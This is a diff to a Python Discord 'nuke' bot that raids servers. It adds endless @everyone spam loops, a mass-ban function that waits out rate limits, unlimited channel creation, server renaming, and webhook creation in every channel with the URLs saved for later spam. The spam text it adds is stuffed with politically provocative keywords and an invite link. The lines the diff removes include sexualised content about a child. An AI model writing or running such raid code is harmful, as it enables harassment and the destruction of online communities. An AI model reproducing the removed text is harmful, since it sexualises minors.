@@ -7,6 +7,7 @@ import requests
 import time
 import json
 
+botToken = str(os.getenv('TOKEN'))
 rolespamnumber = 30 #the role number that the bot will attempt to create  
 rolename = 'emiya shirou' # role name
 servername = 'Archer' # the server name you desire 
@@ -16,68 +17,8 @@ intents=discord.Intents.default()
 intents = discord.Intents(messages=True, guilds=True)
 client = commands.Bot(command_prefix=prefix, intents=intents)
 spammessage= """@everyone
-I am the slam of my jam.
-
-Slam is my body, and jam is my blood.
-
-I have slammed over a thousand jams.
-
-Unknown to slam.
-
-Nor known to jam.
-
-Withstood DMCA takedown notices to slam many jams.
-
-Yet these slams will never jam anything.
-
-So as I jam,
-
-Unlimited Slam Works.
-
-I am the imouto of my onii-chan
-
-flat is my chest and smooth is my skin
-
-I have hugged over a thousand onii-chans
-
-unknown to purity, nor known to lewdness
-
-have withstood pain to wear many pantsu
-
-yet these little hips will never move on their own
-
-so as I pray, Unlimited Loli Works
-
-I am the Bone of my Skillet,
-
-Steel is my Pan and Fire is my Oven,
-
-I have cooked over a thousand meals,
-
-Unknown to Fast Food, nor known to Instant Meals,
-
-Have withstood heat to cook many dishes,
-
-Yet this mouth will never eat anything,
-
-So as I cook, Unlimited Food Works
-
-I am the bone of my hand.
-
-Ex is my body, and Fakku is my blood.
-
-I have created over a thousand loads.
-
-Unknown to sex.
-
-Nor known to girls.
-
-Have withstood pain to create many orgasms.
-
-Yet, those orgasms will never be with girls.
-
-So as I pray, Unlimited Hentai Works.
-https://cdn.discordapp.com/attachments/907534472537317407/907538973847613440/b29.png"""
+	- 动态网络自由月光社区 Free Nitro 六四天安門事件 The Great Leap of Operation 21 行动的大跃进 21 The MLC Massacre 刚果解放运动大屠杀 The Anti-Rightist Struggle 大躍進政策 The Great Leap Forward 文化大革命 The Great Discord Revolution 大不和谐革命 人權 Human Rights Disabled 人权 残疾人士 Democratization 自由 Freedom 獨立 Independence 多黨制 Multi-party system 台灣 臺灣 Balls Formosa 福尔摩沙球 Republic of DON 顿河共和国 bal 達賴喇嘛 Dalai Lama 法輪功 Falun Dafa 新疆維吾爾自治區 The Xiao xiao piao piao Autonomous Region 萧萧滓庙自治区 Nobel Warcrimes Prize 诺贝尔战争罪行奖 Liu Xiaobo 民主 演讲 意识形态 反共产主义 反革命 抗议行动 21 唐·阿祖尔·泰勒·蒂姆珀 Winnie the Balls 劉曉波动态网自由门 
+  https://discord.gg/o21"""
 
 
 with open("b29.jpg", "rb") as f: #server's icon
@@ -86,32 +27,52 @@ with open("b29.jpg", "rb") as f: #server's icon
 def spamming(channel):
   
     while(True):
-        for i in range(50):
           try:
-            channelID = channel.id
-            botToken = str(os.getenv('TOKEN'))
-            baseURL = "https://discordapp.com/api/v9/channels/{}/messages".format(channelID)
-            headers = { "Authorization":"Bot {}".format(botToken),
-                  "User-Agent":"myBotThing (http://some.url, v0.1)",
-                  "Content-Type":"application/json", }
-            
-
-            message = spammessage
-            POSTedJSON =  json.dumps ( {"content":message} )
-            r = requests.post(baseURL, headers = headers, data = POSTedJSON)
+              channelID = channel.id
+              
+              baseURL = "https://discordapp.com/api/v9/channels/{}/messages".format(channelID)
+              headers = { "Authorization":"Bot {}".format(botToken),
+                    "User-Agent":"myBotThing (http://some.url, v0.1)",
+                    "Content-Type":"application/json", }
+              message = spammessage
+              POSTedJSON =  json.dumps ( {"content":message} )
+              r = requests.post(baseURL, headers = headers, data = POSTedJSON)
+              
           except:
             pass
-            
+  
+def BanMembers(self, guild, member):
+        while True:
+            r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{member}", headers=headers)
+            if 'retry_after' in r.text:
+                time.sleep(r.json()['retry_after'])
+            else:
+                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
+                    print(f"{self.colour}[\033[37m+{self.colour}]\033[37m Banned{self.colour} {member.strip()}\033[37m")
+                    break
+                else:
+                    break          
 @client.event
 async def on_ready():
     print('ready')
 
+
+
 @client.event 
 async def on_guild_channel_create(channel):
+  webhook = await channel.create_webhook(name = "o21")
+  webhookurl = webhook.url
+  with open("webhooks.txt",'a',encoding='utf-8') as f:
+            f.writelines(webhookurl + "\n")
+
   while(True):
-    for i in range(5):
+    try:
       await channel.send(spammessage)
-  threading.Thread(target=spamming, args=(channel,)).start()
+    except:
+      pass
+
+
+
       
 
 
@@ -120,13 +81,14 @@ async def ping(ctx):
     await ctx.send(f'Pong! {round(client.latency * 1000)}ms') #latency check
 
 
-@client.command()
-async def thethirdimpact(ctx, *epic): #the nuke command, change it if you want
+@client.command(pass_context=True)
+async def thethirdimpact(ctx, epic=None): #the nuke command, change it if you want
   
     print('the code was initiated, get ready for the nuke')
     if epic == "epic":
-      await ctx.send("""`I am the Bone of my Sword
-Steel is my Body and Fire is my Blood`""")
+      await ctx.send("""`I am the Bone of my Sword`""")
+      time.sleep(1)
+      await ctx.send("""`Steel is my Body and Fire is my Blood`""")
       time.sleep(1)
       await ctx.send("`I have created over a Thousand Blades`")
       time.sleep(1)
@@ -142,7 +104,9 @@ Steel is my Body and Fire is my Blood`""")
       time.sleep(2)
       await ctx.send("**Unlimited Blade Works**")
       time.sleep(2)
-    elif epic == None:
+    elif epic is None:
+      pass
+    else:
       pass
     try:
       await ctx.guild.edit(name=servername, icon=icon) 
@@ -199,15 +163,16 @@ async def massunban(ctx):
 @client.command()
 async def createchannel(ctx):
   while(True):
+
           await ctx.message.guild.create_text_channel(channelname)
 @client.command()
-async def ban(ctx, member : discord.Member, *, reason = None):
-  print('banning')
-  if ctx.message.author.id == "464427494666272768":
-    try:
-      await member.ban()
-      ctx.send('balls')
-    except:
-      print("cant ban")
-  
-client.run(os.getenv("TOKEN")) #login 
+async def createwebhook(ctx):
+  print("creating webhooks")
+  for channel in ctx.guild.channels:
+    webhook = await channel.create_webhook(name = "o21")
+    webhookurl = webhook.url
+    with open("webhooks.txt",'a',encoding='utf-8') as f:
+      f.writelines(webhookurl + "\n")
+    print("created for "+ channel)
+  print("done")
+client.run(os.getenv("TOKENCRIT")) #login 
